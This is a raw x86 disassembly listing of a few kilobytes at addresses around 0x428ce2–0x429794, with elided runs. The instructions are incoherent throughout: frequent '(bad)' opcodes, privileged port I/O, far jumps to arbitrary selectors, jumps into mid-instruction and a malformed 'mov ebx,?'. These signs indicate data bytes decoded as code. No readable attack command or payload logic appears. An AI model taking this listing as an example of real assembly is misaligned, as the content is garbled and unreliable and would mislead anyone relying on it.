  428ce2:	sub    edi,DWORD PTR [ebp-0x4bb4677d]
  428ce8:	rol    DWORD PTR [ecx],0xb4
  428ceb:	fldcw  WORD PTR [ebx+0x725f502f]
  428cf1:	jmp    FWORD PTR [ecx+0x63]
  428cf4:	stos   DWORD PTR es:[edi],eax
  428cf5:	add    bl,BYTE PTR [ecx]
  428cf7:	ds pop esi
  428cf9:	leave  
  428cfa:	inc    esp
  428cfb:	(bad)  
  428cfc:	jne    0x428d04
  428cfe:	pop    ds
  428cff:	inc    dh
  428d01:	(bad)  
  428d02:	enter  0xb032,0x65
  428d06:	sbb    DWORD PTR [eax+0x5a],0xffffffd5
  428d0a:	or     edx,eax
  428d0c:	aam    0x93
  428d0e:	sub    BYTE PTR [ebp-0xb],dl
  428d11:	in     eax,0x41
  428d13:	popa   
  428d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d15:	inc    esi
  428d16:	ret    0x479b
  428d19:	shl    DWORD PTR [edx],0x2e
  428d1c:	pushf  
  428d1d:	mov    edi,0xceb72930
  428d22:	lods   al,BYTE PTR ds:[esi]
  428d23:	or     al,0x0
  428d25:	add    ebp,DWORD PTR [ebp+0x2f8de7f0]
  428d2b:	(bad)  
  428d2c:	cvtps2pd xmm4,xmm6
  428d2f:	xchg   edx,eax
  428d30:	mov    DWORD PTR [esi+0xd6f72ea],edx
  428d36:	cmp    eax,DWORD PTR [esi+0x1e]
  428d39:	push   es
  428d3a:	aam    0x50
  428d3c:	jp     0x428d81
  428d3e:	pop    ss
  428d3f:	dec    ecx
  428d40:	xchg   edi,eax
  428d41:	or     DWORD PTR [ecx-0x4dd6ec6],esi
  428d47:	or     DWORD PTR [eax+0x1e],esp
  428d4a:	lds    edx,FWORD PTR [esi]
  428d4c:	in     al,dx
  428d4d:	nop
  428d4e:	xchg   DWORD PTR fs:[ebx],ebx
  428d51:	mov    ch,0x72
  428d53:	jne    0x428d9d
  428d55:	cmp    ebp,edx
  428d57:	outs   dx,DWORD PTR ds:[esi]
  428d58:	call   0x356:0x9beeed2
  428d5f:	imul   eax,DWORD PTR [ebp+eiz*1+0x60],0x79
  428d64:	jmp    0x7a23f094
  428d69:	sub    BYTE PTR [ecx+0x2f],cl
  428d6c:	adc    BYTE PTR [eax],al
	...
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x6c5c
  428de4:	(bad)  
  428de5:	scas   eax,DWORD PTR es:[edi]
  428de6:	mov    BYTE PTR [ebp+0xff0001],dh
  428dec:	add    BYTE PTR [eax],al
  428dee:	imul   eax,DWORD PTR ds:0xc2d45202,0xc6803ca0
  428df8:	in     eax,0x5d
  428dfa:	ret    0xfc6b
  428dfd:	cmp    DWORD PTR [ecx],ebx
  428dff:	or     eax,0xbaf69b81
  428e04:	(bad)  
  428e05:	push   edx
  428e06:	pop    ebp
  428e07:	fist   WORD PTR [ecx]
  428e09:	rcr    BYTE PTR [edi-0x41],cl
  428e0c:	out    0x20,eax
  428e0e:	into   
  428e0f:	dec    esi
  428e10:	nop
  428e11:	in     eax,0xd
  428e13:	add    BYTE PTR [edi-0x4828a653],al
  428e19:	sbb    eax,0x7c2e90a7
  428e1e:	mov    esi,0x5bbc9372
  428e23:	xchg   DWORD PTR [esi+0x1571620d],ebx
  428e29:	test   BYTE PTR [edi],0x6
  428e2c:	pop    ds
  428e2d:	das    
  428e2e:	push   edx
  428e2f:	sub    ch,BYTE PTR [edi]
  428e31:	add    BYTE PTR [eax+0x1d01a9e3],0xc4
  428e38:	jnp    0x428e33
  428e3a:	retf   0x5009
  428e3d:	jae    0x428ddf
  428e3f:	mov    al,ds:0xa0926049
  428e44:	shl    DWORD PTR [esi-0x6fcd7c4c],cl
  428e4a:	popf   
  428e4b:	mov    al,0x8
  428e4d:	pmaxsw mm5,QWORD PTR [ebx]
  428e50:	mov    esp,0x34603a70
  428e55:	mov    eax,cs:0xfe24ea07
  428e5b:	push   ecx
  428e5c:	mov    ds:0x5857a6b1,al
  428e61:	shl    BYTE PTR [esi+0x68],cl
  428e64:	data16 out dx,al
  428e66:	xor    esi,ebx
  428e68:	cmp    BYTE PTR [edi],al
  428e6a:	jbe    0x428ed0
  428e6c:	jbe    0x428df7
  428e6e:	pop    ebx
  428e6f:	int    0x8f
  428e71:	or     al,0xd8
  428e73:	cmp    al,0xf8
  428e75:	loop   0x428eaf
  428e77:	sbb    DWORD PTR [edi-0x7cbb3d81],ebp
  428e7d:	xchg   edx,eax
  428e7e:	sbb    BYTE PTR [ecx-0xf],dh
  428e81:	jle    0x428e19
  428e83:	aas    
  428e84:	outs   dx,DWORD PTR ds:[esi]
  428e85:	xchg   ebp,eax
  428e86:	pop    edi
  428e87:	mov    edx,0xb586e9d3
  428e8c:	xchg   ecx,eax
  428e8d:	push   edi
  428e8e:	cmp    DWORD PTR [ecx],eax
  428e90:	inc    esi
  428e91:	int    0xbd
  428e93:	xchg   edx,eax
  428e94:	mov    bh,BYTE PTR [edx+0xa40dd4d]
  428e9a:	mov    cl,0x8e
  428e9c:	loope  0x428f1a
  428e9e:	jno    0x428ec7
  428ea0:	dec    eax
  428ea1:	loop   0x428eee
  428ea3:	dec    edx
  428ea4:	sti    
  428ea5:	mov    ds:0x701f3e12,al
  428eaa:	adc    dl,BYTE PTR [ebx-0x6f]
  428ead:	xor    eax,0xe24592e3
  428eb2:	mov    esp,0xfb5e7c74
  428eb7:	fisttp QWORD PTR [edx+0x75c793d3]
  428ebd:	mov    cl,0x2e
  428ebf:	xchg   edi,eax
  428ec0:	sbb    BYTE PTR [edx+0x459a1389],al
  428ec6:	fdiv   st,st(2)
  428ec8:	ja     0x428ea3
  428eca:	rol    DWORD PTR [ebp-0x53],cl
  428ecd:	(bad)  
  428ece:	dec    edi
  428ecf:	or     al,0xa4
  428ed1:	sahf   
  428ed2:	mov    es,WORD PTR [ebp-0x3ce89609]
  428ed8:	sbb    al,0xf8
  428eda:	cmc    
  428edb:	imul   eax,edi,0x37
  428ede:	xchg   ch,ch
  428ee0:	ja     0x428e7a
  428ee2:	test   DWORD PTR [ebp+edi*2+0x62f24e7a],eax
  428ee9:	xor    eax,0x3031a4
	...
  428f56:	dec    edi
  428f57:	pop    ebp
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x81
  428f63:	and    esi,esp
  428f65:	mov    dh,0x87
  428f67:	mov    dh,0x1
  428f69:	add    bh,bh
  428f6b:	add    BYTE PTR [eax],al
  428f6d:	add    dh,al
  428f6f:	sub    dl,BYTE PTR [ebx]
  428f71:	mov    edx,0xd4ef347b
  428f76:	daa    
  428f77:	inc    ecx
  428f78:	jo     0x428f3b
  428f7a:	lahf   
  428f7b:	aas    
  428f7c:	dec    ecx
  428f7d:	outs   dx,BYTE PTR ds:[esi]
  428f7e:	and    BYTE PTR [eax],dh
  428f80:	jbe    0x428f22
  428f82:	popa   
  428f83:	mov    bl,0x85
  428f85:	loopne 0x428fd7
  428f87:	arpl   WORD PTR [edx],sp
  428f89:	adc    eax,0x1028ba79
  428f8e:	ret    0xb75f
  428f91:	pop    esi
  428f92:	(bad)  
  428f93:	xchg   ebp,eax
  428f94:	dec    ebx
  428f95:	std    
  428f96:	popf   
  428f97:	mov    ebx,?
  428f99:	fldcw  WORD PTR [edx]
  428f9b:	jmp    0x7695:0xdf01749c
  428fa2:	jecxz  0x428f2a
  428fa4:	into   
  428fa5:	or     eax,0x225f15b
  428faa:	push   esi
  428fab:	inc    esp
  428fac:	adc    al,0xec
  428fae:	imul   edi,DWORD PTR [edx-0x7e],0x6522d2e9
  428fb5:	stc    
  428fb6:	aas    
  428fb7:	sub    al,0x8b
  428fb9:	into   
  428fba:	aad    0xe5
  428fbc:	pop    esp
  428fbd:	into   
  428fbe:	sub    eax,0xa0512965
  428fc3:	out    0x95,eax
  428fc5:	mov    dh,0xf6
  428fc7:	mov    esp,0x2b7253e9
  428fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fcd:	jg     0x428f66
  428fcf:	sbb    al,0x21
  428fd1:	sbb    BYTE PTR [esi+0x32],dl
  428fd4:	sbb    al,0x1a
  428fd6:	xor    al,0x76
  428fd8:	ss out dx,eax
  428fda:	fwait
  428fdb:	mov    DWORD PTR [eax+0x77],ecx
  428fde:	ss push es
  428fe0:	ins    BYTE PTR es:[edi],dx
  428fe1:	cli    
  428fe2:	jnp    0x429029
  428fe4:	sbb    bh,BYTE PTR ds:0xae8bb6eb
  428fea:	out    dx,eax
  428feb:	jle    0x429004
  428fed:	arpl   WORD PTR [eax-0x3a],ax
  428ff0:	sbb    eax,0xb447fd48
  428ff5:	push   0x389b8e54
  428ffa:	or     DWORD PTR [esi-0x1a05b0bc],edi
  429000:	mov    ecx,0x726070e7
  429005:	inc    ebp
  429006:	adc    al,0x69
  429008:	(bad)  
  42900a:	add    al,BYTE PTR [ecx-0x65692a34]
  429010:	push   ss
  429011:	ins    DWORD PTR es:[edi],dx
  429012:	lahf   
  429013:	cmp    ah,ah
  429015:	lea    esp,[edx+ebx*1]
  429018:	jnp    0x428fce
  42901a:	and    esi,ebx
  42901c:	adc    esp,DWORD PTR [ebx+0x66]
  42901f:	add    al,0xe8
  429021:	call   0xd1050cf1
  429026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429027:	xor    eax,0x7f946caf
  42902c:	ss jg  0x428ff7
  42902f:	pop    edi
  429030:	test   al,0x56
  429032:	push   edi
  429033:	scas   al,BYTE PTR es:[edi]
  429034:	sbb    eax,0x9dbe9185
  429039:	pusha  
  42903a:	xor    bl,dl
  42903c:	and    BYTE PTR ss:[ebx+0x71],bl
  429040:	iret   
  429041:	push   es
  429042:	mov    bh,dl
  429044:	stos   DWORD PTR es:[edi],eax
  429045:	stc    
  429046:	bound  eax,QWORD PTR [esi-0x7a]
  429049:	les    esp,FWORD PTR [ebp+0x5c3e6254]
  42904f:	idiv   esi
  429051:	jmp    0x283ebca4
  429056:	pop    ecx
  429057:	xor    DWORD PTR [ebp-0x4f],edx
  42905a:	pushf  
  42905b:	pop    ss
  42905c:	xor    eax,0x4b268c21
  429061:	js     0x42904a
  429063:	push   edx
  429064:	aas    
  429065:	dec    esp
  429066:	js     0x4290d8
  429068:	add    BYTE PTR [ecx],bh
  42906a:	push   ebx
  42906b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42906c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4290d5:	add    cl,ah
  4290d7:	in     al,dx
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0xacfc7b77
  4290e3:	or     BYTE PTR [ebp+0x30],dl
  4290e6:	xchg   BYTE PTR [edi+0xff0001],dh
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	stc    
  4290ef:	hlt    
  4290f0:	out    0xab,eax
  4290f2:	mov    bh,0x3a
  4290f4:	fld    DWORD PTR [edx+ebp*4-0x54237155]
  4290fb:	test   DWORD PTR [edx+eiz*4-0x1da21799],esp
  429102:	in     eax,dx
  429103:	cmp    al,0xfb
  429105:	rcl    DWORD PTR [esi-0x11],1
  429108:	xchg   ecx,eax
  429109:	pop    ss
  42910a:	adc    eax,DWORD PTR [eax-0x53]
  42910d:	outs   dx,DWORD PTR ds:[esi]
  42910e:	loop   0x429106
  429110:	retf   0x5e5d
  429113:	xchg   ecx,eax
  429114:	cmp    eax,0xcdc03fc6
  429119:	jne    0x429109
  42911b:	in     al,0x6f
  42911d:	push   0x9db67b58
  429122:	xor    DWORD PTR [edi],0x3
  429125:	add    BYTE PTR [eax+0x11a6ca42],bh
  42912b:	pop    edi
  42912c:	arpl   WORD PTR [ebp+0x1f],bp
  42912f:	test   BYTE PTR [edi-0x71],bh
  429132:	xor    DWORD PTR [ebp-0x312fa6e9],edx
  429138:	and    ebx,DWORD PTR [ecx]
  42913a:	jno    0x4291ac
  42913c:	pop    ebx
  42913d:	push   cs
  42913e:	mov    al,BYTE PTR [eax-0x16]
  429141:	adc    esp,eax
  429143:	pop    ebp
  429144:	arpl   WORD PTR [eax+ecx*8-0x66],bx
  429148:	mov    bh,0x45
  42914a:	inc    ecx
  42914b:	cmp    eax,0x5de943cc
  429150:	adc    ebx,eax
  429152:	sbb    edi,DWORD PTR [eax]
  429154:	ds cdq 
  429156:	dec    ebp
  429157:	sti    
  429158:	inc    esp
  429159:	xor    BYTE PTR [edx],dh
  42915b:	loop   0x4290ef
  42915d:	push   edx
  42915e:	ror    DWORD PTR ds:0xb39f0bf2,cl
  429164:	dec    ecx
  429165:	or     ebp,esp
  429167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429168:	mov    eax,0xb15c10a0
  42916d:	pop    ebx
  42916e:	sub    BYTE PTR [edi-0x6f],bh
  429171:	in     eax,0xa4
  429173:	jae    0x429163
  429175:	add    edx,DWORD PTR [eax+0x1]
  429178:	push   esp
  429179:	cmp    DWORD PTR [edx+0x9],0x9931a611
  429180:	iret   
  429181:	(bad)  
  429182:	idiv   DWORD PTR [ebx]
  429184:	cmp    eax,0x74c3735f
  429189:	lea    esp,[eax+0x6a]
  42918c:	lahf   
  42918d:	(bad)  
  42918e:	xchg   edi,eax
  42918f:	cmp    eax,0x2107fa5d
  429194:	xchg   esi,eax
  429195:	inc    eax
  429196:	mov    ds,WORD PTR [edx+0x25d33888]
  42919c:	(bad)  
  42919d:	inc    ecx
  42919f:	or     ebp,ecx
  4291a1:	sub    eax,0x67a08c61
  4291a6:	sahf   
  4291a7:	mov    ebp,DWORD PTR [edi+0x6a096d39]
  4291ad:	addr16 jmp 0x429130
  4291b0:	or     eax,0xf81305d2
  4291b5:	mov    eax,ds:0xfbaf6183
  4291ba:	mov    bl,0x8e
  4291bc:	cmp    bl,BYTE PTR [edx]
  4291be:	xor    esi,ebp
  4291c0:	dec    ecx
  4291c1:	jae    0x429230
  4291c3:	sar    ah,cl
  4291c5:	inc    edx
  4291c6:	xchg   dl,bh
  4291c8:	and    al,ah
  4291ca:	xchg   ebx,eax
  4291cb:	mov    dl,0x6c
  4291cd:	push   ds
  4291ce:	and    cl,bl
  4291d0:	test   BYTE PTR [eax],0x8f
  4291d3:	vmwrite ebx,DWORD PTR [edi+edx*4-0x70]
  4291d8:	ins    DWORD PTR es:[edi],dx
  4291d9:	adc    esp,eax
  4291db:	push   0xffffff9e
  4291dd:	test   eax,0x7cf81820
  4291e2:	sub    BYTE PTR [edx*8+0x27edf268],bl
  4291e9:	into   
  4291ea:	jge    0x42919c
  4291ec:	das    
	...
  429255:	add    BYTE PTR [esi-0x79],dl
  429258:	std    
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [ecx+esi*2-0x7acbfbb0],0xff0001b8
  42926b:	add    BYTE PTR [eax],al
  42926d:	add    BYTE PTR [ecx+0x1afa119f],ch
  429273:	jl     0x42922a
  429275:	adc    DWORD PTR [eax+eiz*1-0x7289a363],eax
  42927c:	fsub   DWORD PTR [ecx-0x6c]
  42927f:	in     al,0xcf
  429281:	std    
  429282:	pop    ecx
  429283:	pop    ss
  429284:	lods   eax,DWORD PTR ds:[esi]
  429285:	xchg   BYTE PTR ds:0x6e8f626b,al
  42928b:	xchg   edx,eax
  42928c:	dec    esp
  42928d:	(bad)  
  42928e:	adc    edi,edi
  429290:	loope  0x4292b5
  429292:	push   edi
  429293:	adc    edx,DWORD PTR [edi]
  429295:	int    0xe1
  429297:	data16 (bad) 
  429299:	rol    esi,1
  42929b:	sbb    eax,0x8cf64a3f
  4292a0:	mov    ch,0x2a
  4292a2:	fisttp DWORD PTR [edx+eax*8]
  4292a5:	sub    bl,BYTE PTR [esi+0x79cb82ef]
  4292ab:	(bad)  
  4292ac:	into   
  4292ad:	dec    esi
  4292ae:	xor    esp,DWORD PTR [edi]
  4292b0:	rcr    DWORD PTR [esi],0xed
  4292b3:	je     0x4292b5
  4292b5:	imul   ecx,DWORD PTR [edi+0x7c978db2],0x15f854e
  4292bf:	retf   0x2790
  4292c2:	mov    eax,ds:0x6a7b4468
  4292c7:	xor    DWORD PTR [edx+0x56f8604d],esi
  4292cd:	mov    cl,0x63
  4292cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292d0:	pop    es
  4292d1:	test   eax,0xcd5a6026
  4292d6:	out    0x34,eax
  4292d8:	scas   al,BYTE PTR es:[edi]
  4292d9:	or     al,0x19
  4292db:	cld    
  4292dc:	jae    0x429294
  4292de:	adc    al,0xed
  4292e0:	popf   
  4292e1:	mov    eax,ds:0x22829907
  4292e6:	lods   al,BYTE PTR ds:[esi]
  4292e7:	jns    0x429361
  4292e9:	test   al,0x8e
  4292eb:	pop    ds
  4292ec:	push   0x3bf0cc72
  4292f1:	mov    cl,0x57
  4292f3:	xlat   BYTE PTR ds:[ebx]
  4292f4:	dec    edx
  4292f5:	ret    
  4292f6:	add    eax,0x53593b37
  4292fb:	mov    esp,0x3a42d377
  429300:	push   ecx
  429301:	repz mov cl,0x56
  429304:	outs   dx,DWORD PTR ds:[esi]
  429305:	add    DWORD PTR [edi+ebx*2],eax
  429308:	adc    al,0xee
  42930a:	xlat   BYTE PTR ds:[ebx]
  42930b:	mov    bl,0x49
  42930d:	loope  0x4292a9
  42930f:	div    DWORD PTR [eax+0x2d]
  429312:	or     BYTE PTR [ecx-0x4f],dh
  429315:	cs mov esi,0xcfa33c08
  42931b:	imul   eax,DWORD PTR [ecx+edx*1+0x13],0xffffff81
  429320:	(bad)  
  429321:	dec    ebx
  429322:	or     DWORD PTR ds:0xbcc285b5,0x7d
  429329:	jmp    0x4292c6
  42932b:	pusha  
  42932c:	enter  0xa5aa,0x87
  429330:	inc    edi
  429331:	dec    edx
  429332:	inc    esi
  429333:	js     0x4292b9
  429335:	xchg   esp,eax
  429336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429337:	pop    edx
  429338:	shl    BYTE PTR [ecx],1
  42933a:	sub    DWORD PTR [ecx],0xe2e184e4
  429340:	lahf   
  429341:	call   0xf15a:0x4679a3b2
  429348:	(bad)  
  429349:	push   ds
  42934a:	push   eax
  42934b:	call   0x10080678
  429350:	mov    al,ds:0x2161f3f
  429355:	das    
  429356:	push   esp
  429357:	adc    al,0x39
  429359:	jb     0x429341
  42935b:	cmp    DWORD PTR [ebx+0x34],ebx
  42935e:	mov    ecx,0x6a06f49c
  429363:	push   esp
  429364:	jp     0x42932b
  429366:	aad    0xe0
  429368:	jecxz  0x429347
  42936a:	jmp    0x4372fc
	...
  4293d3:	add    BYTE PTR [eax],al
  4293d5:	add    al,dh
  4293d7:	adc    al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0x5
  4293e3:	loop   0x429373
  4293e5:	(bad)  
  4293e6:	test   BYTE PTR [ecx+0xff0001],bh
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	xchg   ebx,eax
  4293ef:	(bad)
  4293f2:	jecxz  0x4293f5
  4293f4:	and    ebp,DWORD PTR [ebx-0x23b59998]
  4293fa:	(bad)  
  4293fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293fc:	add    DWORD PTR [edi+esi*1-0x4d],ebp
  429400:	in     al,0x4e
  429402:	call   0x38e36054
  429407:	fsub   st(7),st
  429409:	mov    dh,0x48
  42940b:	push   es
  42940c:	js     0x42946b
  42940e:	adc    al,0x98
  429410:	mov    ecx,0xde767e06
  429415:	loope  0x4293dc
  429417:	call   0xbe75f964
  42941c:	(bad)  
  42941d:	frstor [ebx]
  42941f:	dec    eax
  429420:	cmp    BYTE PTR [edi+0x2b50d073],dl
  429426:	mov    edx,0x24068566
  42942b:	out    dx,al
  42942c:	mov    esp,0x31b40a9b
  429431:	xchg   BYTE PTR [ebp+0x5a13e52c],dh
  429437:	pop    es
  429438:	cmc    
  429439:	retf   0xfa4e
  42943c:	push   eax
  42943d:	sahf   
  42943e:	or     BYTE PTR [ebp+0x55efbfdf],0x7a
  429445:	xor    BYTE PTR [edx+0x7a84ebe7],bh
  42944b:	or     ecx,ebp
  42944d:	dec    edx
  42944e:	push   cs
  42944f:	fs sub eax,ebx
  429452:	ss clc 
  429454:	push   esp
  429455:	xor    edx,DWORD PTR [ecx-0x4a]
  429458:	stc    
  429459:	nop
  42945a:	mov    esp,0xdcdeb299
  42945f:	cmc    
  429460:	int3   
  429461:	pop    edi
  429462:	arpl   cx,dx
  429464:	in     eax,0xeb
  429466:	push   eax
  429467:	cld    
  429468:	fisub  WORD PTR [eax]
  42946a:	cmp    bl,al
  42946c:	cmovo  ecx,DWORD PTR [esi-0x55a97d61]
  429473:	shl    dh,0x83
  429476:	data16 lods al,BYTE PTR ds:[esi]
  429478:	adc    ecx,ebx
  42947a:	cs jae 0x429488
  42947d:	sbb    DWORD PTR [edx],esp
  42947f:	cwde   
  429480:	retf   
  429481:	div    BYTE PTR [ecx-0x1]
  429484:	jge    0x4294d9
  429486:	das    
  429487:	mov    DWORD PTR [edi+0x206d931f],0xc3c5acff
  429491:	push   0xffffffa2
  429493:	test   DWORD PTR [esi-0x33],ecx
  429496:	sbb    BYTE PTR [ebx-0x5f],ch
  429499:	mov    edi,0x7add9495
  42949e:	nop
  42949f:	mov    ds:0x7e00d88b,eax
  4294a4:	and    eax,0x865f98ae
  4294a9:	inc    ecx
  4294aa:	jns    0x4294bc
  4294ac:	xchg   BYTE PTR [eax-0x57],bh
  4294af:	jns    0x4294b4
  4294b1:	xchg   ebx,eax
  4294b2:	mov    edx,edx
  4294b4:	cmp    eax,0x15590b35
  4294b9:	sub    BYTE PTR [edx+0x59],0xff
  4294bd:	jmp    0x429487
  4294bf:	mov    gs,WORD PTR [ecx-0x7e]
  4294c2:	fistp  WORD PTR [ecx+0x48c450db]
  4294c8:	retf   0x2eda
  4294cb:	jecxz  0x429540
  4294cd:	nop
  4294ce:	enter  0x4b91,0x7a
  4294d2:	nop
  4294d3:	rcl    ebx,cl
  4294d5:	hlt    
  4294d6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4294d8:	or     eax,0xe50acfe6
  4294dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4294de:	sahf   
  4294df:	fsub   QWORD PTR [esp+ebp*1]
  4294e2:	cmp    esp,DWORD PTR [ebx]
  4294e4:	mov    ebp,0x3b57ecc5
  4294e9:	aas    
  4294ea:	(bad)  
  4294eb:	pop    ebx
  4294ec:	fadd   DWORD PTR [eax]
	...
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp-0x362fa516],dx
  429565:	cmp    DWORD PTR [bp+si+0x1],0xffffffff
  42956b:	add    BYTE PTR [eax],al
  42956d:	add    BYTE PTR [esp+edx*8],ah
  429570:	ret    0x971e
  429573:	mov    ebp,0xbc2d4d75
  429578:	(bad)  
  429579:	das    
  42957a:	dec    edi
  42957b:	add    dl,BYTE PTR [eax]
  42957d:	or     esi,esi
  42957f:	stos   BYTE PTR es:[edi],al
  429580:	les    ebx,FWORD PTR [esp+edi*4]
  429583:	push   ss
  429584:	cli    
  429585:	pusha  
  429586:	cmp    dl,BYTE PTR [edx]
  429588:	pop    esp
  429589:	mov    ch,BYTE PTR [eax+ebx*1-0x2e]
  42958d:	lahf   
  42958e:	js     0x4295a1
  429590:	push   cs
  429591:	shl    BYTE PTR ds:0x28562fb3,0x6e
  429598:	sbb    esp,DWORD PTR [esi-0x56]
  42959b:	stos   DWORD PTR es:[edi],eax
  42959c:	stos   BYTE PTR es:[edi],al
  42959d:	neg    BYTE PTR [ecx-0x7ca64eb9]
  4295a3:	cmp    DWORD PTR [eax+0x58],ecx
  4295a6:	jns    0x4295a3
  4295a8:	sbb    eax,0xf83385b2
  4295ad:	push   esp
  4295ae:	imul   esp
  4295b0:	cmc    
  4295b1:	cs push 0x51ee70f6
  4295b7:	mov    ch,0x6a
  4295b9:	sar    DWORD PTR [bp+si],cl
  4295bc:	call   FWORD PTR [edi+0x5f]
  4295bf:	jp     0x429541
  4295c1:	jbe    0x429548
  4295c3:	sbb    bh,al
  4295c5:	mov    eax,0xab3ea4c3
  4295ca:	pop    esi
  4295cb:	call   0x29a9:0xba187e8e
  4295d2:	dec    eax
  4295d3:	jmp    0x429572
  4295d5:	and    edi,DWORD PTR [ebp+0x2b]
  4295d8:	dec    edi
  4295d9:	xor    dh,bl
  4295db:	into   
  4295dc:	repnz sbb BYTE PTR [ebp+0x36],ch
  4295e0:	(bad)  
  4295e1:	(bad)  
  4295e2:	ficom  WORD PTR [ebx+eax*8-0x245080ec]
  4295e9:	jmp    0x74fe:0x8b288b5d
  4295f0:	stos   DWORD PTR es:[edi],eax
  4295f1:	jge    0x429628
  4295f3:	shr    BYTE PTR [esi-0x6c3016a5],0x5c
  4295fa:	cmp    ebp,ebp
  4295fc:	loopne 0x4295ec
  4295fe:	pop    eax
  4295ff:	jmp    0x920a:0xabaf48ee
  429606:	mov    al,0x39
  429608:	or     ebx,DWORD PTR [edx-0x7a93aa27]
  42960e:	mov    esp,0x4c9b1308
  429613:	adc    edi,DWORD PTR [eax]
  429615:	adc    BYTE PTR [eax+eax*8-0x6b],bh
  429619:	sub    eax,0x29be2286
  42961e:	xchg   ebp,eax
  42961f:	stos   DWORD PTR es:[edi],eax
  429620:	push   edx
  429621:	add    edx,DWORD PTR [ecx]
  429623:	xor    DWORD PTR [edi-0x2ddb47da],esp
  429629:	into   
  42962a:	hlt    
  42962b:	jp     0x4295db
  42962d:	out    dx,eax
  42962e:	pop    ecx
  42962f:	push   esp
  429630:	and    eax,0xe6d41c3
  429635:	push   ss
  429636:	fadd   QWORD PTR [esi-0x1f]
  429639:	sbb    DWORD PTR [ecx*2-0x2c73749a],esi
  429640:	pop    ebx
  429641:	scas   eax,DWORD PTR es:[edi]
  429642:	sub    al,0xaf
  429644:	mov    ah,0xf4
  429646:	ret    
  429647:	mov    WORD PTR [ebp-0x2c],ds
  42964a:	jmp    0x735:0x4018716a
  429651:	fnstsw WORD PTR ds:0xba749f5c
  429657:	out    0xe1,al
  429659:	imul   ecx,DWORD PTR [edi-0x4],0x476b169f
  429660:	dec    esi
  429661:	stos   BYTE PTR es:[edi],al
  429662:	cmp    ch,BYTE PTR [ecx+0x94895d7]
  429668:	add    eax,0x27e81b5
	...
  4296d5:	add    BYTE PTR [ebp+0x1d],ch
  4296d8:	out    0xc0,al
  4296da:	idiv   bl
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	outs   dx,DWORD PTR ds:[esi]
  4296e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296e4:	pop    eax
  4296e5:	mov    cl,0x82
  4296e7:	mov    ebx,0xff0001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	sbb    al,0x68
  4296f0:	pushw  0xe5c2
  4296f4:	xchg   edi,eax
  4296f5:	popa   
  4296f6:	shl    BYTE PTR [esi-0x21],1
  4296f9:	mov    ds:0x4459b8a8,al
  4296fe:	cmp    eax,0xd9f779dd
  429703:	pop    edi
  429704:	sbb    bh,0xf3
  429707:	mov    al,ch
  429709:	lods   al,BYTE PTR ds:[esi]
  42970a:	mov    dh,0x67
  42970c:	jb     0x429728
  42970e:	dec    esp
  42970f:	les    esi,FWORD PTR [edx-0x5b]
  429712:	xchg   edi,eax
  429713:	int    0xc2
  429715:	ja     0x429785
  429717:	inc    ecx
  429718:	xchg   edx,eax
  429719:	retf   
  42971a:	mov    ds:0xef0db84a,al
  42971f:	outs   dx,BYTE PTR ds:[esi]
  429720:	repz mov cl,0x4e
  429723:	mov    ecx,0xc29ce486
  429728:	adc    ch,BYTE PTR [esi+edx*1-0x6713b89e]
  42972f:	xor    bh,al
  429731:	int3   
  429732:	sahf   
  429733:	fstp   DWORD PTR [ecx]
  429735:	pop    edi
  429736:	mov    eax,DWORD PTR [ecx+ecx*2-0x6]
  42973a:	out    dx,eax
  42973b:	sub    al,0xa4
  42973d:	xchg   esp,eax
  42973e:	and    eax,0x2eb58e29
  429743:	in     al,dx
  429744:	lods   al,BYTE PTR gs:[esi]
  429746:	sub    DWORD PTR [edi],ebx
  429748:	xchg   BYTE PTR [edx+0x13],bl
  42974b:	pop    esi
  42974c:	xor    dh,ch
  42974e:	sub    BYTE PTR [edx],bh
  429750:	(bad)  
  429751:	out    0x18,eax
  429753:	xchg   ch,bl
  429755:	xor    DWORD PTR [ebp-0x29],ebp
  429758:	push   cs
  429759:	xchg   esi,eax
  42975a:	fs pop edi
  42975c:	jne    0x429736
  42975e:	add    DWORD PTR es:[ebx],0xffffffb7
  429762:	dec    edi
  429763:	out    dx,al
  429764:	cmp    bh,ch
  429766:	inc    ebp
  429767:	push   edx
  429768:	mov    edx,edi
  42976a:	cmp    al,0x5b
  42976c:	es popf 
  42976e:	mov    eax,0xcf033d06
  429773:	add    cl,BYTE PTR [edi-0x3a3321b4]
  429779:	mov    edx,0x1e62d9f5
  42977e:	jle    0x429787
  429780:	mov    esi,0xebc1e9f0
  429785:	dec    edx
  429786:	test   DWORD PTR [eax+0x7e],0x598a99e
  42978d:	lods   eax,DWORD PTR ds:[esi]
  42978e:	add    eax,0x7a0be381
  429793:	xchg   ebx,eax
  429794:	aad    0x8f
